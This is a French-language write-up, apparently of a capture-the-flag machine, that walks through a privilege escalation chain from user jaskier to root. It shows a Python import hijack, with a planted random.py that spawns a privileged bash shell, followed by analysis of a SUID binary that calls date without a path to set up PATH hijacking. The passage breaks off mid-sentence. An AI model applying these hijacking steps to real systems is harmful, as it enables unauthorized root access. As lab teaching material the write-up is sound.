# Élévation de privilèges

## 1. Vue d'ensemble

L'objectif de cette exploitation est d'obtenir un accès `root` à partir des identifiants de l'utilisateur `jaskier`.

La chaîne d'exploitation complète repose sur trois mécanismes distincts :

1. **Python Import Hijacking** permettant de passer de `jaskier` à `yen`.
2. **SUID + PATH Hijacking** permettant de passer de `yen` à `geralt`.
3. **Sudo NOPASSWD avec Perl** permettant de passer de `geralt` à `root`.

La chaîne complète est donc :

```text
jaskier
   │
   │ sudo → Python
   │
   ▼
Python Import Hijacking
   │
   ▼
yen
   │
   │ SUID portal
   │ PATH Hijacking
   ▼
geralt
   │
   │ sudo NOPASSWD → Perl
   ▼
root
```

---

# 2. Passage de `jaskier` à `yen`

Après avoir récupéré les identifiants de `jaskier`, nous nous connectons à la machine via SSH :

```bash
ssh jaskier@<IP>
```

Nous commençons par vérifier les commandes pouvant être exécutées avec `sudo` :

```bash
sudo -l
```

Le système retourne :

```text
User jaskier may run the following commands on the_continent:
    (yen) /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

Cela signifie que `jaskier` est autorisé à exécuter précisément :

```bash
/usr/bin/python3 /home/jaskier/toss-a-coin.py
```

avec les privilèges de l'utilisateur `yen`.

## 2.1 Analyse du script Python

Nous examinons le contenu du script :

```bash
cat /home/jaskier/toss-a-coin.py
```

Le script importe notamment le module Python `random` :

```python
import random
```

Le fichier appartient à `root` et n'est pas modifiable par `jaskier` :

```text
-rw-r--r-- 1 root root 1430 Aug 27 09:42 /home/jaskier/toss-a-coin.py
```

Il n'est donc pas possible de modifier directement le script.

Cependant, Python recherche les modules importés dans différents emplacements de son chemin d'importation. Il est donc possible de tenter de placer un module `random.py` contrôlé par l'utilisateur dans un emplacement prioritaire.

## 2.2 Python Import Hijacking

Nous créons un fichier `random.py` contenant du code permettant de lancer un shell :

```python
import os
os.execl("/bin/bash", "bash", "-p")
```

Lorsque `toss-a-coin.py` effectue :

```python
import random
```

Python peut alors charger notre fichier `random.py` au lieu du module légitime.

Nous exécutons ensuite le script avec les privilèges de `yen` :

```bash
sudo -u yen /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

Le code présent dans notre module est exécuté avec les privilèges de `yen`.

Nous obtenons alors un shell :

```text
uid=1002(yen) gid=1002(yen) groups=1002(yen)
```

La première étape de l'escalade est donc :

```text
jaskier → yen
```

---

# 3. Énumération en tant que `yen`

Maintenant que nous disposons d'un shell avec les privilèges de `yen`, nous examinons son répertoire personnel :

```bash
ls -la
```

Nous découvrons notamment le binaire :

```text
-rwsr-sr-x 1 root root 16872 Aug 27 09:42 portal
```

Le `s` présent dans :

```text
-rwsr-sr-x
```

indique que le bit **SUID** est activé.

Le propriétaire du fichier étant `root`, le programme s'exécute avec l'UID effectif de `root`, même lorsqu'il est lancé par un utilisateur non privilégié.

Nous sommes donc face à un binaire SUID potentiellement intéressant.

---

# 4. Analyse du binaire `portal`

Nous commençons par examiner les chaînes présentes dans le binaire :

```bash
strings portal
```

Parmi les chaînes intéressantes, nous trouvons :

```text
I am preparing a portal for you Geralt.
/bin/echo -n 'It will be ready in about ' && date --date='next hour' -R
You just have to wait for it
```

La commande exécutée contient :

```text
date --date='next hour' -R
```

Un élément important est que `date` est appelé sans chemin absolu.

Le programme utilise également la fonction :

```text
system@@GLIBC_2.2.5
```

ce qui indique l'utilisation de `system()` pour exécuter une commande via le shell.

La différence entre les deux appels est donc importante :

```text
/bin/echo
```

utilise un chemin absolu, tandis que :

```text
date
```

est résolu à partir du `PATH`.

---

# 5. Exploitation du PATH Hijacking

## 5.1 Principe

Lorsqu'une commande telle que :

```bash
date
```

est exécutée sans chemin absolu, le shell recherche l'exécutable dans les différents répertoires définis dans :

```bash
$P
```
